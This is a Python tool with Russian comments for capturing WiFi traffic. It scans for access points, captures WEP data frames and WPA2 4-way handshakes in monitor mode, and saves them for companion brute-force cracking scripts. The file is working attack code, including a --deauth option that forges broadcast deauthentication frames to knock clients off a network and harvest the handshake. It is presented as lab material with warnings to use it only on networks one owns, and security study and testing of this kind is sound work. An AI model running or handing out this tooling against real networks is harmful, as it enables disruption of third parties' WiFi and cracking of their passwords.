"""
capture_traffic.py — Захват реального WiFi-трафика
====================================================
Перехватывает WEP-фреймы и WPA2-handshake с живого сетевого интерфейса
и сохраняет в форматы, совместимые с bruteforce_benchmark.py и lab_aes_wpa2.py.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
ТРЕБОВАНИЯ:
  • Linux (Ubuntu/Kali/Parrot)
  • Python 3.10+
  • pip install scapy
  • WiFi-адаптер с поддержкой monitor mode
  • Права root (sudo)
  • Только для СВОИХ сетей или в рамках письменного разрешения!
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

КАК ВОСПРОИЗВЕСТИ ПОШАГОВО:

Шаг 1. Установить зависимости:
         pip install scapy

Шаг 2. Узнать имя интерфейса:
         iwconfig
         # или: ip link show

Шаг 3. Включить monitor mode:
         sudo ip link set wlan0 down
         sudo iw wlan0 set monitor none
         sudo ip link set wlan0 up
         # ИЛИ через aircrack-ng:
         sudo airmon-ng start wlan0
         # (интерфейс может переименоваться в wlan0mon)

Шаг 4. Сканировать сети и найти нужную:
         sudo python capture_traffic.py scan --iface wlan0mon

Шаг 5а. Захватить WEP-фреймы:
         sudo python capture_traffic.py wep \\
             --iface wlan0mon \\
             --ssid MyWEPNetwork \\
             --count 200

Шаг 5б. Захватить WPA2-handshake:
         sudo python capture_traffic.py wpa \\
             --iface wlan0mon \\
             --ssid HomeNetwork \\
             --timeout 120

Шаг 6. Вернуть интерфейс:
         sudo ip link set wlan0mon down
         sudo iw wlan0mon set type managed
         sudo ip link set wlan0mon up

Шаг 7. Использовать захваченные файлы:
         python bruteforce_benchmark.py --wep-capture data/captures/real_wep.wep
         python lab_aes_wpa2.py --capture data/captures/real_wpa2.json
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
"""

import os
import sys
import json
import time
import struct
import argparse
import subprocess
import threading
from datetime import datetime

# Цвета терминала
def _c(code, s): return f"\033[{code}m{s}\033[0m"
def green(s):   return _c('92', s)
def red(s):     return _c('91', s)
def yellow(s):  return _c('93', s)
def bold(s):    return _c('1',  s)
def cyan(s):    return _c('96', s)

try:
    from scapy.all import (sniff, Dot11, Dot11Beacon, Dot11Elt, Dot11WEP,
                           EAPOL, RadioTap, sendp, Dot11Deauth, get_if_list)
    HAS_SCAPY = True
except ImportError:
    HAS_SCAPY = False

sys.path.insert(0, os.path.dirname(__file__))
from generate_test_data import WEP_MAGIC, load_handshake


# ══════════════════════════════════════════════════════════════════════
# Вспомогательные функции интерфейса
# ══════════════════════════════════════════════════════════════════════

def check_root():
    if os.geteuid() != 0:
        print(red("[!] Требуется root. Запустите: sudo python capture_traffic.py ..."))
        sys.exit(1)


def set_channel(iface: str, channel: int):
    subprocess.run(['iw', 'dev', iface, 'set', 'channel', str(channel)],
                   capture_output=True)


def get_wireless_interfaces() -> list[str]:
    """Возвращает список wireless-интерфейсов из /proc/net/wireless."""
    try:
        result = subprocess.run(['iw', 'dev'], capture_output=True, text=True)
        ifaces = []
        for line in result.stdout.splitlines():
            if 'Interface' in line:
                ifaces.append(line.split()[-1])
        return ifaces
    except FileNotFoundError:
        return []


# ══════════════════════════════════════════════════════════════════════
# Сканирование AP
# ══════════════════════════════════════════════════════════════════════

def do_scan(iface: str, duration: int = 15):
    """
    Сканирует эфир и выводит таблицу AP.

    Алгоритм:
      1. Запускаем channel hopper (каждые 0.3с меняем канал 1-13)
      2. Слушаем Beacon фреймы через Scapy sniff()
      3. Из каждого Beacon извлекаем: SSID (IE id=0), канал (IE id=3),
         тип защиты (capability bit 4 + RSN IE id=48), RSSI (RadioTap)
      4. Выводим таблицу; WEP-сети красным как уязвимые
    """
    check_root()
    aps = {}

    def pkt_handler(pkt):
        if not pkt.haslayer(Dot11Beacon):
            return
        bssid = pkt[Dot11].addr2
        if bssid in aps:
            return

        ssid, channel, security = '<hidden>', 0, 'Open'
        elt = pkt.getlayer(Dot11Elt)
        while elt:
            if elt.ID == 0:
                try: ssid = elt.info.decode('utf-8', errors='replace')
                except: pass
            if elt.ID == 3 and len(elt.info) == 1:
                channel = elt.info[0]
            if elt.ID == 48:
                security = 'WPA2'
            if elt.ID == 221 and elt.info[:4] == b'\x00\x50\xf2\x01':
                security = 'WPA'
            elt = elt.payload.getlayer(Dot11Elt)

        cap = pkt[Dot11Beacon].cap
        if (cap & 0x10) and security == 'Open':
            security = 'WEP'

        rssi = -99
        try:
            if pkt.haslayer(RadioTap) and pkt[RadioTap].dBm_AntSignal:
                rssi = pkt[RadioTap].dBm_AntSignal
        except: pass

        aps[bssid] = dict(ssid=ssid, bssid=bssid, ch=channel, sec=security, rssi=rssi)

    stop_hop = threading.Event()
    def hopper():
        ch = 1
        while not stop_hop.is_set():
            set_channel(iface, ch)
            ch = ch % 13 + 1
            time.sleep(0.3)
    threading.Thread(target=hopper, daemon=True).start()

    print(f"\n{bold('Сканирование')} ({iface}, {duration}s) ...")
    try:
        sniff(iface=iface, prn=pkt_handler, timeout=duration, store=False)
    except KeyboardInterrupt:
        pass
    finally:
        stop_hop.set()

    if not aps:
        print(yellow("Сетей не найдено."))
        return

    print(f"\n{bold('─'*70)}")
    print(f"  {'SSID':<25} {'BSSID':<20} {'CH':>3}  {'Защита':<8}  RSSI")
    print(f"{'─'*70}")
    for ap in sorted(aps.values(), key=lambda x: -x['rssi']):
        sec = ap['sec']
        sec_colored = red(f"{sec:<8}") if sec=='WEP' else (yellow(f"{sec:<8}") if sec=='WPA' else green(f"{sec:<8}"))
        print(f"  {ap['ssid']:<25} {ap['bssid']:<20} {ap['ch']:>3}  {sec_colored}  {ap['rssi']:>4} dBm")
    print(f"{'─'*70}")
    print(f"  Найдено: {len(aps)} сетей, "
          f"{sum(1 for a in aps.values() if a['sec']=='WEP')} WEP (уязвимы)\n")


# ══════════════════════════════════════════════════════════════════════
# Захват WEP-фреймов
# ══════════════════════════════════════════════════════════════════════

def do_capture_wep(
    iface:   str,
    ssid:    str  = None,
    bssid:   str  = None,
    count:   int  = 200,
    timeout: int  = 180,
    out:     str  = 'data/captures/real_wep.wep',
    key_len: int  = 5,
):
    """
    Захватывает зашифрованные WEP Data-фреймы и сохраняет в .wep файл.

    Как работает перехват:
      1. Scapy slушает все фреймы в monitor mode
      2. Фильтруем: тип фрейма = 2 (Data) + FC Protected bit = 1
      3. Scapy парсит Dot11WEP layer: iv (3 байта) + keyid (1 байт) + ciphertext
      4. Собираем в формат: iv || keyid || ciphertext
      5. Записываем в .wep файл с заголовком WEP_MAGIC

    Почему нужен активный трафик:
      WEP-фреймы появляются только когда клиент что-то передаёт.
      Без трафика — нет фреймов. Для ускорения можно запустить
      ping или скачать что-то на клиентском устройстве.
    """
    check_root()
    frames = []
    bssid_found = [None]

    def handler(pkt):
        # Определяем BSSID по Beacon (если задан SSID)
        if ssid and not bssid_found[0] and pkt.haslayer(Dot11Beacon):
            elt = pkt.getlayer(Dot11Elt)
            while elt:
                if elt.ID == 0:
                    try:
                        if elt.info.decode('utf-8', 'replace') == ssid:
                            bssid_found[0] = pkt[Dot11].addr2
                            print(f"\n[+] AP найдена: {bssid_found[0]}")
                    except: pass
                elt = elt.payload.getlayer(Dot11Elt)

        # WEP Data frame
        if not (pkt.haslayer(Dot11) and pkt.haslayer(Dot11WEP)):
            return
        if pkt[Dot11].type != 2:
            return
        if not (pkt[Dot11].FCfield & 0x40):
            return

        target = bssid or bssid_found[0]
        if target:
            addrs = {pkt[Dot11].addr1, pkt[Dot11].addr2, pkt[Dot11].addr3}
            if target.lower() not in addrs:
                return

        try:
            w  = pkt[Dot11WEP]
            iv = bytes([w.iv[0], w.iv[1], w.iv[2]])
            kid = bytes([w.keyid])
            ct  = bytes(w.wepdata)
            frames.append(iv + kid + ct)
            n = len(frames)
            if n % 10 == 0 or n == count:
                print(f"\r  [{n}/{count}] фреймов захвачено", end='', flush=True)
        except Exception:
            pass

    print(f"\n{bold('WEP Capture')} — цель: {ssid or bssid or 'любая WEP-сеть'}")
    print(f"  Нужно {count} фреймов, таймаут {timeout}s")
    print(f"  Ctrl+C для остановки\n")

    try:
        sniff(iface=iface,
              stop_filter=lambda p: (handler(p) or False) or len(frames) >= count,
              timeout=timeout, store=False)
    except KeyboardInterrupt:
        print(yellow(f"\n  Прервано ({len(frames)} фреймов)"))

    if not frames:
        print(red("\n[!] Фреймы не захвачены. Проверьте: monitor mode, канал, наличие трафика."))
        return

    # Сохраняем
    os.makedirs(os.path.dirname(out), exist_ok=True)
    with open(out, 'wb') as f:
        f.write(WEP_MAGIC)
        f.write(struct.pack('<B', key_len))
        f.write(struct.pack('<I', len(frames)))
        for fr in frames:
            f.write(struct.pack('<H', len(fr)))
            f.write(fr)

    print(f"\n{green('[+] WEP-захват сохранён:')} {out}  ({len(frames)} фреймов)")


# ══════════════════════════════════════════════════════════════════════
# Захват WPA2 Handshake
# ══════════════════════════════════════════════════════════════════════

def do_capture_wpa(
    iface:   str,
    ssid:    str  = None,
    bssid:   str  = None,
    timeout: int  = 120,
    deauth:  bool = False,
    out:     str  = 'data/captures/real_wpa2.json',
):
    """
    Захватывает WPA2 4-way handshake и сохраняет в JSON.

    Как работает захват:
      4-way handshake происходит при каждом подключении клиента к AP.
      Нам нужны Message 1 (AP→Client, содержит ANonce) и
      Message 2 (Client→AP, содержит SNonce + MIC).

      1. Слушаем EAPOL-Key фреймы
      2. Message 1: ack_flag=1, mic_flag=0 → берём ANonce
      3. Message 2: ack_flag=0, mic_flag=1, MIC≠0 → берём SNonce+MIC
      4. Нулируем MIC в копии EAPOL (для верификации паролей)
      5. Сохраняем в JSON

    Опция --deauth:
      Отправляет deauth-пакеты → клиент переподключается → выдаёт handshake.
      Использовать ТОЛЬКО на своих сетях!
    """
    check_root()

    anonce = snonce = aa = sa = mic = eapol_frame = None
    bssid_found = [bssid]
    complete = [False]

    def _parse_eapol_key(raw: bytes):
        if len(raw) < 99 or raw[1] != 0x03 or raw[4] != 0x02:
            return None
        ki = int.from_bytes(raw[5:7], 'big')
        return {
            'ack': bool(ki & (1<<7)),
            'mic_flag': bool(ki & (1<<8)),
            'pairwise': bool(ki & (1<<3)),
            'nonce':    raw[17:49],
            'mic':      raw[81:97],
            'has_mic':  any(raw[81:97]),
            'raw':      raw,
        }

    def handler(pkt):
        nonlocal anonce, snonce, aa, sa, mic, eapol_frame

        if ssid and not bssid_found[0] and pkt.haslayer(Dot11Beacon):
            elt = pkt.getlayer(Dot11Elt)
            while elt:
                if elt.ID == 0:
                    try:
                        if elt.info.decode('utf-8', 'replace') == ssid:
                            bssid_found[0] = pkt[Dot11].addr2
                            print(f"\n[+] AP: {bssid_found[0]} ({ssid})")
                    except: pass
                elt = elt.payload.getlayer(Dot11Elt)
            return

        if not pkt.haslayer(EAPOL):
            return

        try:
            raw = bytes(pkt[EAPOL])
        except: return

        p = _parse_eapol_key(raw)
        if not p: return

        src = pkt[Dot11].addr2 if pkt.haslayer(Dot11) else None
        dst = pkt[Dot11].addr1 if pkt.haslayer(Dot11) else None

        # Message 1: от AP (ack=1, mic=0)
        if p['ack'] and not p['has_mic'] and p['pairwise']:
            anonce = p['nonce']
            aa = bytes.fromhex(src.replace(':', '')) if src else None
            print(f"\n  [>] Msg1 ANonce от AP ({src})")

        # Message 2: от клиента (ack=0, mic=1)
        elif p['mic_flag'] and not p['ack'] and p['pairwise'] and p['has_mic']:
            snonce = p['nonce']
            sa = bytes.fromhex(src.replace(':', '')) if src else None
            if aa is None:
                aa = bytes.fromhex(dst.replace(':', '')) if dst else None
            mic = p['mic']
            zeroed = bytearray(raw)
            zeroed[81:97] = b'\x00' * 16
            eapol_frame = bytes(zeroed)
            print(f"  [>] Msg2 SNonce+MIC от клиента ({src})")
            if anonce is not None:
                complete[0] = True
                print(green(f"\n  [+] HANDSHAKE ЗАХВАЧЕН!"))

    print(f"\n{bold('WPA2 Capture')} — цель: {ssid or bssid or 'любая WPA2-сеть'}")
    print(f"  Таймаут: {timeout}s  |  deauth: {'да' if deauth else 'нет'}")
    print(f"  Ожидаем подключения клиента...\n")

    if deauth and (bssid or bssid_found[0]):
        def send_deauth():
            time.sleep(3)
            target = bssid or bssid_found[0]
            if not target: return
            pkt_d = (RadioTap() /
                     Dot11(addr1='ff:ff:ff:ff:ff:ff', addr2=target, addr3=target,
                           type=0, subtype=12) /
                     Dot11Deauth(reason=7))
            print(yellow(f"  [!] Отправляем deauth → {target}"))
            sendp(pkt_d, iface=iface, count=5, inter=0.1, verbose=False)
        threading.Thread(target=send_deauth, daemon=True).start()

    try:
        sniff(iface=iface, prn=handler,
              stop_filter=lambda p: complete[0],
              timeout=timeout, store=False)
    except KeyboardInterrupt:
        print(yellow("\n  Прервано"))

    if not complete[0]:
        print(red("\n[!] Handshake не захвачен."))
        print(yellow("    Советы: убедитесь в monitor mode, правильном канале,"))
        print(yellow("    попробуйте --deauth или подождите подключения клиента."))
        return

    # Сохраняем
    os.makedirs(os.path.dirname(out), exist_ok=True)
    data = {
        'protocol':    'WPA2',
        'ssid':        ssid or 'unknown',
        'aa':          aa.hex(),
        'sa':          sa.hex(),
        'anonce':      anonce.hex(),
        'snonce':      snonce.hex(),
        'eapol_frame': eapol_frame.hex(),
        'mic':         mic.hex(),
        'source':      'real_capture',
        'captured_at': datetime.now().isoformat(),
    }
    with open(out, 'w') as f:
        json.dump(data, f, indent=2)
    print(f"{green('[+] Handshake сохранён:')} {out}")
    print(f"    MIC: {mic.hex()}")


# ══════════════════════════════════════════════════════════════════════
# CLI
# ══════════════════════════════════════════════════════════════════════

def main():
    if not HAS_SCAPY:
        print(red("[!] Установите scapy: pip install scapy"))
        sys.exit(1)

    parser = argparse.ArgumentParser(
        description='Захват WiFi-трафика с реального интерфейса',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Примеры:
  sudo python capture_traffic.py scan --iface wlan0mon
  sudo python capture_traffic.py wep  --iface wlan0mon --ssid MyWEP --count 200
  sudo python capture_traffic.py wpa  --iface wlan0mon --ssid HomeNet --deauth
        """
    )
    sub = parser.add_subparsers(dest='cmd', required=True)

    p_scan = sub.add_parser('scan', help='Сканировать AP в эфире')
    p_scan.add_argument('--iface',    required=True)
    p_scan.add_argument('--duration', type=int, default=15)

    p_wep = sub.add_parser('wep', help='Захватить WEP Data-фреймы')
    p_wep.add_argument('--iface',   required=True)
    p_wep.add_argument('--ssid',    default=None)
    p_wep.add_argument('--bssid',   default=None)
    p_wep.add_argument('--count',   type=int, default=200)
    p_wep.add_argument('--timeout', type=int, default=180)
    p_wep.add_argument('--key-len', type=int, default=5, choices=[5,13])
    p_wep.add_argument('--out',     default='data/captures/real_wep.wep')

    p_wpa = sub.add_parser('wpa', help='Захватить WPA2 4-way handshake')
    p_wpa.add_argument('--iface',   required=True)
    p_wpa.add_argument('--ssid',    default=None)
    p_wpa.add_argument('--bssid',   default=None)
    p_wpa.add_argument('--timeout', type=int, default=120)
    p_wpa.add_argument('--deauth',  action='store_true')
    p_wpa.add_argument('--out',     default='data/captures/real_wpa2.json')

    args = parser.parse_args()

    if args.cmd == 'scan':
        do_scan(args.iface, args.duration)
    elif args.cmd == 'wep':
        do_capture_wep(args.iface, args.ssid, args.bssid,
                       args.count, args.timeout, args.out, args.key_len)
    elif args.cmd == 'wpa':
        do_capture_wpa(args.iface, args.ssid, args.bssid,
                       args.timeout, args.deauth, args.out)


if __name__ == '__main__':
    main()
